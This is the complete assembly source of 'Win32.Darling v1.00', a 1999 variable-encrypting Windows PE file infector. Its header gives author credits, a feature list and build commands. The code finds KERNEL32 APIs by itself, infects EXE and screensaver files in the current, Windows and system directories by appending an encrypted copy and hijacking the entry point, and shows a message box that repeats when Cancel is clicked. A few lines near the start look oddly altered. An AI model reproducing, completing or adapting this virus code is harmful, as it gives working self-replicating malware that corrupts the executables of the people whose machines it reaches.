;============================================================================
;
;
;     NAME: Win32.Darling v1.00
;     TYPE: Direct-action variable-encrypting PE-infector.
;     SIZE: Around 1700 bytes.
;   AUTHOR: T-2000 / [Immortal Riot].
;   E-MAIL: T2000_@hotmail.com
;     DATE: May 1999.
;  PAYLOAD: Randomly pops-up a message-box.
;
;
;  FEATURES:
;
;       - True Win32-compatible (Win-95/98/NT).
;       - Variable encrypting (32-bit key).
;       - Traps possible errors with a SEH.
;       - Infects files in current/windoze/system-directory.
;       - Non-destructive payload (ARGHHH!!!!!).
;
;
; Nothing brand new at all, this is just a quick Win32.Savior hack, with
; some improvements. Now it fetches API from KERNEL32.DLL's export-table,
; so it doesn't have to rely on the host's imports anymore...
;
; Succesfully tested on Win95 (OSR/2), Win98, and WinNT (4.0).
;
;
; KNOWN PROBLEMS:
;
; For some reason my infected dummy-files start executing wrongly decrypted
; code, this only happens when a small file is executed two times in a row,
; under NT. It doesn't look like a bug of mine, I suspect the caching is
; fucking things up.
;
;
; Assemble with: TASM32 SAVIOR.ASM /m /ml
;                TLINK32 SAVIOR.OBJ IMPORT32.LIB
;                PEWRSEC SAVIOR.EXE
;
;============================================================================


                .386p
                .MODEL  FLAT
                .CODE

                ORG     0


EXTRN           ExitProcess:PROC        ; Only used by the carrier.


Debug_Mode      =       1               ; If true, only DUM?.* files are
                                        ; targetted for infection.

Virus_Size      EQU     (Virus_End-START)
Virus_Size_Mem  EQU     (Virus_End_Mem-START)
Max_Infect      EQU     4
Min_Size_Infect EQU     4096


START:
push eax
lidt [esp-2]
pop eax
jmp Carrier
                PUSH    ESP                     ; Reserve room for EIP.

                PUSHFD                          ; Save registers & flags.
                PUSHAD

                CALL    Get_Delta               ; Get our location in memory.

Anti_Moron      DB      0E9h                    ; Overlapping code, anti BP.

Get_Delta:      POP     EBP
                SUB     EBP, (Anti_Moron-START)

                MOV     EAX, 0
Init_Key        =       DWORD PTR $-4

                MOV     EBX, 0
Init_Slide      =       DWORD PTR $-4

                MOV     ECX, (Virus_End-Encrypted) / 4

                PUSH    EBP

Decrypt_DWORD:  XOR     [EBP+(Virus_Size-4)], EAX

                SUB     EBP, 4

                ADD     EAX, EBX                ; Slide decryption-key.

                RCL     EBX, 3                  ; Slide key-slider.

                LOOP    Decrypt_DWORD

                POP     EBP

IF              (($-START) MOD 4) GT 0
                DB      (4 - (($-START) MOD 4)) DUP(90h)
ENDIF

Encrypted:      MOV     EAX, EBP

                SUB     EAX, 1000h              ; Calculate image-base.
Base_Displ      =       DWORD PTR $-4

                LEA     EBX, [EAX+((Carrier-START)+1000h)]
Old_EIP_RVA     =       DWORD PTR $-4

                MOV     [ESP+(9*4)], EBX        ; Set address host in stack.

                CALL    Setup_SEH               ; PUSH SEH-address on stack.

                MOV     ESP, [ESP+(2*4)]        ; Restore original stack.

                JMP     Restore_SEH             ; Terminate program-flow.

Setup_SEH:      PUSH    DWORD PTR FS:[ECX]      ; Save original SEH-pointer.
;                MOV     FS:[ECX], ESP           ; Set our own SEH.

                CLD

                MOV     EAX, [ESP+(12*4)]

                XOR     AX, AX

Find_K32_Base:  CMP     EAX, 400000h            ; Below application-memory?
                JB      JMP_Rest_SEH            ; ARGHH! Not found!

                CMP     [EAX.EXE_Mark], 'ZM'
                JNE     Scan_Downwards

                CMP     [EAX.Reloc_Table], 40h
                JB      Scan_Downwards

                MOV     EBX, [EAX+3Ch]
                ADD     EBX, EAX

                CMP     [EBX.PE_Mark], 'EP'
                JNE     Scan_Downwards

                MOV     EBX, [EBX+120]          ; K32's export-table.
                ADD     EBX, EAX

                MOV     ESI, [EBX+(3*4)]        ; ASCIIZ-name of DLL.
                ADD     ESI, EAX

                PUSH    EAX

                LODSD
                CALL    Upcase_EAX

                XCHG    ECX, EAX

                LODSD
                CALL    Upcase_EAX

                CMP     EAX, '23LE'             ; Check for KERNEL32.DLL.

                POP     EAX

                JNE     Scan_Downwards

                CMP     ECX, 'NREK'             ; Found KERNEL32.DLL ?
                JE      Found_K32_Base

Scan_Downwards: SUB     EAX, 65536

                JMP     Find_K32_Base

Virus_Name      DB      'Win32.Darling v1.00', 0

JMP_Rest_SEH:   JMP     Restore_SEH             ; Abort all.

Found_K32_Base: MOV     EDX, [EBX+(8*4)]        ; Array of name RVA's.
                ADD     EDX, EAX

                MOV     ECX, [EBX+(6*4)]        ; Amount of name entries.

                DEC     ECX                     ; Last entry name.

Find_GPA:       MOV     EDI, [EDX+(ECX*4)]      ; Offset name.
                ADD     EDI, EAX

                PUSHAD

                LEA     ESI, [EBP+(GetProcAddress_Name-START)]
                PUSH    15
                POP     ECX
                REPE    CMPSB

                POPAD

                JNE     LOOP_Find_GPA

                MOV     ESI, [EBX+(9*4)]        ; Array of API ordinals.
                ADD     ESI, EAX

                MOVZX   ESI, WORD PTR [ESI+(ECX*2)]

                MOV     EBX, [EBX+(7*4)]        ; Array of API RVA's.
                ADD     EBX, EAX

                LEA     EBX, [EBX+(ESI*4)]

                MOV     ESI, [EBX]
                ADD     ESI, EAX

                MOV     [EBP+(GetProcAddress-START)], ESI

LOOP_Find_GPA:  LOOP    Find_GPA

                XCHG    EBX, EAX

                LEA     ESI, [EBP+(API_Names-START)]
                LEA     EDI, [EBP+(API_Addresses-START)]

Loop_Get_API:   PUSH    ESI
                PUSH    EBX
                CALL    [EBP+(GetProcAddress-START)]

                CLD                             ; Store API-address.
                STOSD

                XCHG    ECX, EAX                ; API not found?
                JECXZ   JMP_Rest_SEH

Find_Next_API:  LODSB

                OR      AL, AL                  ; Found end of API-name?
                JNZ     Find_Next_API

                CMP     [ESI], AL               ; We've did 'em all?
                JNZ     Loop_Get_API

                LEA     ESI, [EBP+(Current_Directory-START)]
                MOV     EBX, 260

                PUSH    ESI

                PUSH    ESI                     ; Retrieve current path.
                PUSH    EBX
                CALL    [EBP+(GetCurrentDirectoryA-START)]

                ADD     ESI, EBX

                PUSH    ESI

                PUSH    EBX                     ; Retrieve Windoze-directory.
                PUSH    ESI
                CALL    [EBP+(GetWindowsDirectoryA-START)]

                ADD     ESI, EBX

                PUSH    ESI

                PUSH    EBX                     ; Retrieve System-directory.
                PUSH    ESI
                CALL    [EBP+(GetSystemDirectoryA-START)]

                ; Infect files in System-directory.

                CALL    [EBP+(SetCurrentDirectoryA-START)]
                CALL    Infect_Directory

                ; Infect files in Windoze-directory.

                CALL    [EBP+(SetCurrentDirectoryA-START)]
                CALL    Infect_Directory

                ; Infect files in current-directory.

                CALL    [EBP+(SetCurrentDirectoryA-START)]
                CALL    Infect_Directory

                CALL    [EBP+(GetTickCount-START)]

                CMP     AL, 10
                JA      Restore_SEH
                                jmp      Restore_SEH
;gall
                LEA     EAX, [EBP+(USER32_Name-START)]
                PUSH    EAX
                CALL    [EBP+(GetModuleHandleA-START)]

                XCHG    ECX, EAX
                JECXZ   Restore_SEH

                LEA     EAX, [EBP+(MessageBoxA_Name-START)]
                PUSH    EAX
                PUSH    ECX
                CALL    [EBP+(GetProcAddress-START)]

                OR      EAX, EAX
                JZ      Restore_SEH

                XCHG    EBX, EAX

                ; Display an OK/Cancel-box with a message.

Show_Our_Box:   PUSH    30h OR 01h
                LEA     EAX, [EBP+(Payload_Title-START)]
                PUSH    EAX
                LEA     EAX, [EBP+(Payload_Text-START)]
                PUSH    EAX
                PUSH    0
                CALL    EBX

                DEC     EAX                     ; They're disrespecting us
                DEC     EAX                     ; by clicking on Cancel?
                JZ      Show_Our_Box            ; Then just repeat all.

Restore_SEH:    XOR     EAX, EAX

                POP     DWORD PTR FS:[EAX]      ; Restore original SEH.
                POP     EAX                     ; Trash handler-address.

Execute_Host:   POPAD                           ; Restore registers & flags.
                POPFD

                RET                             ; RETurn to our host.


Payload_Title   DB      'http://www.drrling.se', 0

Payload_Text    DB      'THIS IS A DEDICATION TO THE BEST MAGAZINE '
                DB      'IN SWEDEN, DARLING. - IR IN ''99', 0


Infect_Directory:

                PUSHAD

                ; Clear infection-counter.

                AND     BYTE PTR [EBP+(Infect_Counter-START)], 0

                LEA     EAX, [EBP+(Search_Record-START)]
                PUSH    EAX
                LEA     EAX, [EBP+(Search_Mask-START)]
                PUSH    EAX
                CALL    [EBP+(FindFirstFileA-START)]

                MOV     ESI, EAX                ; Save search-handle in ESI.

                INC     EAX
                JZ      Exit_Inf_Dir

Infect_Loop:    PUSHAD

                LEA     EBX, [EBP+(Search_Record.Find_File_Name-START)]

                MOV     ESI, EBX

                CLD

Find_End_Name:  LODSB                           ; Get next byte of filename.

                OR      AL, AL                  ; Found end of the ASCIIZ ?
                JNZ     Find_End_Name

                MOV     EAX, [ESI-5]            ; Get extension DWORD.
                CALL    Upcase_EAX

                CMP     EAX, 'EXE.'             ; Standard .EXE-file?
                JE      Extension_OK

                CMP     EAX, 'RCS.'             ; Screensaver?
                JNE     Exit_Infect

Extension_OK:   PUSH    EBX
                CALL    [EBP+(GetFileAttributesA-START)]

                CMP     EAX, -1                 ; Error occurred?
                JE      Exit_Infect

                MOV     ESI, EAX

                AND     AL, NOT 00000001b       ; Get rid of readonly-flag.

                PUSH    EAX
                PUSH    EBX
                CALL    [EBP+(SetFileAttributesA-START)]

                DEC     EAX                     ; Error occurred?
                JNZ     Exit_Infect

                PUSH    ESI                     ; PUSH filename + attributes
                PUSH    EBX                     ; for Restore_Attr.

                PUSH    EAX                     ; Open candidate-file.
                PUSH    EAX
                PUSH    3                       ; Open existing.
                PUSH    EAX
                PUSH    EAX
                PUSH    80000000h OR 40000000h  ; Read/write-access.
                PUSH    EBX
                CALL    [EBP+(CreateFileA-START)]

                MOV     [EBP+(File_Handle-START)], EAX

                MOV     ESI, EAX

                INC     EAX                     ; Error occurred?
                JZ      Restore_Attr

                PUSH    ESI                     ; For CloseHandle.

                PUSH    0                       ; Get candidate's filesize.
                PUSH    ESI
                CALL    [EBP+(GetFileSize-START)]

                CMP     EAX, Min_Size_Infect    ; File too small?
                JB      Close_Handle

                LEA     EAX, [EBP+(Time_Last_Write-START)]

                PUSH    EAX                     ; Get filedates & times.
                SUB     EAX, 8
                PUSH    EAX
                SUB     EAX, 8
                PUSH    EAX
                PUSH    ESI
                CALL    [EBP+(GetFileTime-START)]

                ; Read the MZ-header.

Read_Header:    LEA     EBX, [EBP+(Header-START)]
                PUSH    40h
                POP     ECX
                CALL    Read_File
                JNZ     Close_Handle

                CMP     [EBX.EXE_Mark], 'ZM'    ; It must be a true EXE-file.
                JNE     Close_Handle

                CMP     [EBX.Reloc_Table], 40h  ; Contains a new EXE-header?
                JB      Close_Handle

                MOV     ESI, [EBX+3Ch]

                MOV     EAX, ESI                ; Seek to PE-header.
                CALL    Seek_File
                JZ      Close_Handle

                PUSH    92                      ; Read-in the PE-header.
                POP     ECX
                CALL    Read_File
                JNZ     Close_Handle

                CMP     [EBX.PE_Mark], 'EP'     ; Verify it's a PE-header.
                JNE     Close_Handle

                ; Program is executable?

                TEST    BYTE PTR [EBX.PE_Flags], 00000010b
                JZ      Close_Handle

                ; Don't infect DLL's.

                TEST    BYTE PTR [EBX.PE_Flags+1], 00100000b
                JNZ     Close_Handle

                CMP     [EBX.CPU_Type], 14Ch    ; Must be a 386+ file.
                JNE     Close_Handle

                ; Is it already infected?

                CMP     [EBX.Checksum], 93FB2AA7h
                JE      Close_Handle

                PUSH    ESI

                ; Calculate position of the last section-header.

                MOVZX   EAX, [EBX.Number_Of_Sections]
                DEC     AX
                PUSH    40
                POP     ECX
                MUL     ECX

                ; Calculate size of PE-header.

                MOV     DX, [EBX.NT_Header_Size]
                ADD     DX, 24

                LEA     ECX, [ESI+EDX]          ; Start section-headers.

                ADD     EAX, ECX                ; EAX = last section-header.

                PUSH    EAX

                ; Seek to last section-header.

                CALL    Seek_File

                LEA     ESI, [EBP+(Last_Section_Header-START)]

                PUSH    EBX

                MOV     EBX, ESI                ; Read last section-header.
                PUSH    40
                POP     ECX
                CALL    Read_File

                POP     EBX

                MOV     EAX, [ESI.Section_RVA]
                ADD     EAX, [ESI.Section_Physical_Size]

                MOV     [EBP+(Base_Displ-START)], EAX

                XCHG    [EBX.EIP_RVA], EAX

                MOV     [EBP+(Old_EIP_RVA-START)], EAX

                ; Seek to the end of the section.

                MOV     EAX, [ESI.Section_Physical_Offset]
                ADD     EAX, [ESI.Section_Physical_Size]
                CALL    Seek_File

                MOV     EAX, [ESI.Section_Physical_Size]
                ADD     EAX, Virus_Size
                MOV     ECX, [EBX.File_Align]
                CALL    Align_EAX

                MOV     [ESI.Section_Physical_Size], EAX

                XCHG    EDI, EAX                ; Save physical-size in EDI.

                MOV     EAX, [ESI.Section_Virtual_Size]
                MOV     ECX, [EBX.Object_Align]
                CALL    Align_EAX

                SUB     [EBX.Image_Size], EAX

                ADD     EAX, Virus_Size_Mem - 1

Calc_Mem_Size:  INC     EAX
                CALL    Align_EAX

                CMP     EAX, EDI                ; Virtual-size may not be
                JB      Calc_Mem_Size           ; smaller than physical-size.

                MOV     [ESI.Section_Virtual_Size], EAX

                ADD     [EBX.Image_Size], EAX

                ; Set section-flags: read, write, executable, & code.

                OR      [ESI.Section_Flags], 11100000000000000000000000100000b

                LEA     EDI, [EBP+(Buffer-START)]

                PUSHAD

                ; Get a random slide-key.

                CALL    [EBP+(GetTickCount-START)]

                MOV     [EBP+(Init_Slide-START)], EAX

                XCHG    EBX, EAX

                ; Get a random encryption-key.

                CALL    [EBP+(GetTickCount-START)]

                MOV     [EBP+(Init_Key-START)], EAX

                MOV     ESI, EBP
                MOV     ECX, (Virus_Size / 4)
                CLD
                REP     MOVSD

                MOV     ECX, (Virus_End-Encrypted) / 4

Encrypt_DWORD:  SUB     EDI, 4

                XOR     [EDI], EAX

                ADD     EAX, EBX

                RCL     EBX, 3

                LOOP    Encrypt_DWORD

                POPAD

                MOV     EDX, EDI                ; Write virusbody to end
                MOV     ECX, Virus_Size         ; of the last section.
                CALL    Write_File

                POP     EAX                     ; Offset last object-header.
                CALL    Seek_File

                ; Write updated section-header back to file.

                PUSH    40
                POP     ECX
                LEA     EDX, [EBP+(Last_Section_Header-START)]
                CALL    Write_File

                ; Seek to end of file.

                PUSH    2
                PUSH    EAX
                PUSH    EAX
                PUSH    DWORD PTR [EBP+(File_Handle-START)]
                CALL    [EBP+(SetFilePointer-START)]

                XOR     EDX, EDX                ; Zero-pad the infected file.
                MOV     EDI, [EBX.File_Align]
                DIV     EDI

                OR      EDX, EDX                ; File is already aligned?
                JZ      Mark_Inf_File

                SUB     EDI, EDX                ; Howmany bytes to pad?

Zero_Pad:       PUSH    1                       ; Write a padding-byte.
                POP     ECX
                LEA     EDX, [EBP+(Zero_Tolerance-START)]
                CALL    Write_File

                DEC     EDI                     ; We've did 'em all?
                JNZ     Zero_Pad

Mark_Inf_File:  MOV     [EBX.Checksum], 93FB2AA7h

                POP     EAX                     ; Seek to start of PE-header.
                CALL    Seek_File

                PUSH    92                      ; Write updated PE-header.
                POP     ECX
                MOV     EDX, EBX
                CALL    Write_File

                ; Increment our infection-counter.

                INC     BYTE PTR [EBP+(Infect_Counter-START)]

                ; Restore original file-dates & times.

Restore_Stamp:  LEA     EAX, [EBP+(Time_Last_Write-START)]
                PUSH    EAX
                SUB     EAX, 8
                PUSH    EAX
                SUB     EAX, 8
                PUSH    EAX
                PUSH    DWORD PTR [EBP+(File_Handle-START)]
                CALL    [EBP+(SetFileTime-START)]

Close_Handle:   CALL    [EBP+(CloseHandle-START)]

Restore_Attr:   CALL    [EBP+(SetFileAttributesA-START)]

Exit_Infect:    POPAD

                ; We've did enough infections?

                CMP     BYTE PTR [EBP+(Infect_Counter-START)], Max_Infect
                JNB     Close_Find

                ; Find another file.

                LEA     EAX, [EBP+(Search_Record-START)]
                PUSH    EAX
                PUSH    ESI
                CALL    [EBP+(FindNextFileA-START)]

                DEC     EAX                     ; Continue if search went OK.
                JZ      Infect_Loop

Close_Find:     PUSH    ESI                     ; Close search-handle.
                CALL    [EBP+(FindClose-START)]

Exit_Inf_Dir:   POPAD

                RET


; EAX = Offset.
; Returns ZF if error.
Seek_File:
                PUSH    0
                PUSH    0
                PUSH    EAX
                PUSH    DWORD PTR [EBP+(File_Handle-START)]
                CALL    [EBP+(SetFilePointer-START)]

                INC     EAX

                RET


; EBX = Buffer.
; ECX = Bytes to read.
; Returns ZF if successful.
Read_File:
                PUSH    0
                LEA     EAX, [EBP+(Bytes_Read-START)]
                PUSH    EAX
                PUSH    ECX
                PUSH    EBX
                PUSH    DWORD PTR [EBP+(File_Handle-START)]
                CALL    [EBP+(ReadFile-START)]

                DEC     EAX

                RET


; ECX = Amount of bytes.
; EDX = Buffer.
; Returns ZF if successful.
Write_File:
                PUSH    0
                LEA     EAX, [EBP+(Bytes_Read-START)]
                PUSH    EAX
                PUSH    ECX
                PUSH    EDX
                PUSH    12345678h
File_Handle     =       DWORD PTR $-4
                CALL    [EBP+(WriteFile-START)]

                DEC     EAX

                RET


Align_EAX:
                XOR     EDX, EDX
                DIV     ECX

                OR      EDX, EDX                ; Even division?
                JZ      No_Round                ; Then no need to round-up.

                INC     EAX                     ; Round-up.

No_Round:       MUL     ECX

                RET


Upcase_EAX:
                ROL     EAX, 8
                CALL    Upcase_AL

                ROL     EAX, 8
                CALL    Upcase_AL

                ROL     EAX, 8
                CALL    Upcase_AL

                ROL     EAX, 8

Upcase_AL:      CMP     AL, 'a'
                JB      Exit_Upcase_AL

                CMP     AL, 'z'
                JA      Exit_Upcase_AL

                SUB     AL, 'a' - 'A'

Exit_Upcase_AL: RET


IF              Debug_Mode

Search_Mask     DB      'DUM?.*', 0

ELSE

Search_Mask     DB      '*.*', 0

ENDIF


USER32_Name             DB      'USER32', 0
MessageBoxA_Name        DB      'MessageBoxA', 0
GetProcAddress_Name     DB      'GetProcAddress', 0

API_Names:              DB      'GetCurrentDirectoryA', 0
                        DB      'SetCurrentDirectoryA', 0
                        DB      'GetWindowsDirectoryA', 0
                        DB      'GetSystemDirectoryA', 0
                        DB      'FindFirstFileA', 0
                        DB      'FindNextFileA', 0
                        DB      'FindClose', 0
                        DB      'GetFileAttributesA', 0
                        DB      'SetFileAttributesA', 0
                        DB      'CreateFileA', 0
                        DB      'CloseHandle', 0
                        DB      'GetFileTime', 0
                        DB      'SetFileTime', 0
                        DB      'GetFileSize', 0
                        DB      'SetFilePointer', 0
                        DB      'ReadFile', 0
                        DB      'WriteFile', 0
                        DB      'GetModuleHandleA', 0
                        DB      'GetTickCount', 0
Zero_Tolerance          DB      0


IF              (($-START) MOD 4) GT 0
                DB      (4 - (($-START) MOD 4)) DUP(0)
ENDIF

Virus_End:


API_Addresses:

; === Our needed API from KERNEL32.DLL. ===

GetCurrentDirectoryA    DD      0
SetCurrentDirectoryA    DD      0
GetWindowsDirectoryA    DD      0
GetSystemDirectoryA     DD      0
FindFirstFileA          DD      0
FindNextFileA           DD      0
FindClose               DD      0
GetFileAttributesA      DD      0
SetFileAttributesA      DD      0
CreateFileA             DD      0
CloseHandle             DD      0
GetFileTime             DD      0
SetFileTime             DD      0
GetFileSize             DD      0
SetFilePointer          DD      0
ReadFile                DD      0
WriteFile               DD      0
GetModuleHandleA        DD      0
GetTickCount            DD      0

GetProcAddress          DD      0

Time_Creation           DD      0, 0
Time_Last_Access        DD      0, 0
Time_Last_Write         DD      0, 0

Infect_Counter          DB      0
Bytes_Read              DD      0
Header                  DB      92 DUP(0)
Last_Section_Header     DB      40 DUP(0)
Search_Record           DB      318 DUP(0)

Current_Directory       DB      260 DUP(0)
Windows_Directory       DB      260 DUP(0)
System_Directory        DB      260 DUP(0)

Buffer                  DB      Virus_Size DUP(0)

Virus_End_Mem:


Carrier:
                PUSH    0                       ; Terminate current process.
                CALL    ExitProcess


;---------------------- SOME USED STRUCTURES --------------------------------


EXE_Header      STRUC
EXE_Mark        DW      0                       ; MZ-marker (MZ or ZM).
Image_Mod_512   DW      0
Image_512_Pages DW      0
Reloc_Items     DW      0
Header_Size_Mem DW      0
Min_Size_Mem    DW      0
Max_Size_Mem    DW      0
Program_SS      DW      0
Program_SP      DW      0
MZ_Checksum     DW      0
Program_IP      DW      0
Program_CS      DW      0
Reloc_Table     DW      0
EXE_Header      ENDS


PE_Header               STRUC
PE_Mark                 DD      0               ; PE-marker (PE/0/0).
CPU_Type                DW      0               ; Minimal CPU required.
Number_Of_Sections      DW      0               ; Number of sections in PE.
                        DD      0
Reserved_1              DD      0
                        DD      0
NT_Header_Size          DW      0
PE_Flags                DW      0
                        DD      4 DUP(0)
EIP_RVA                 DD      0
                        DD      2 DUP(0)
Image_Base              DD      0
Object_Align            DD      0
File_Align              DD      0
                        DW      0, 0
                        DW      0, 0
                        DW      0, 0
                        DD      0
Image_Size              DD      0
                        DD      0
Checksum                DD      0
PE_Header               ENDS


Section_Header          STRUC
Section_Name            DB      8 DUP(0)        ; Zero-padded section-name.
Section_Virtual_Size    DD      0               ; Memory-size of section.
Section_RVA             DD      0               ; Start section in memory.
Section_Physical_Size   DD      0               ; Section-size in file.
Section_Physical_Offset DD      0               ; Section file-offset.
Section_Reserved_1      DD      0               ; Not used for executables.
Section_Reserved_2      DD      0               ; Not used for executables.
Section_Reserved_3      DD      0               ; Not used for executables.
Section_Flags           DD      0               ; Flags of the section.
Section_Header          ENDS


Find_First_Next_Win32   STRUC
File_Attributes         DD      0
Creation_Time           DD      0, 0
Last_Accessed_Time      DD      0, 0
Last_Written_Time       DD      0, 0
Find_File_Size_High     DD      0
Find_File_Size_Low      DD      0
Find_Reserved_1         DD      0
Find_Reserved_2         DD      0
Find_File_Name          DB      260 DUP(0)
Find_DOS_File_Name      DB      14 DUP(0)
Find_First_Next_Win32   ENDS

                END     START





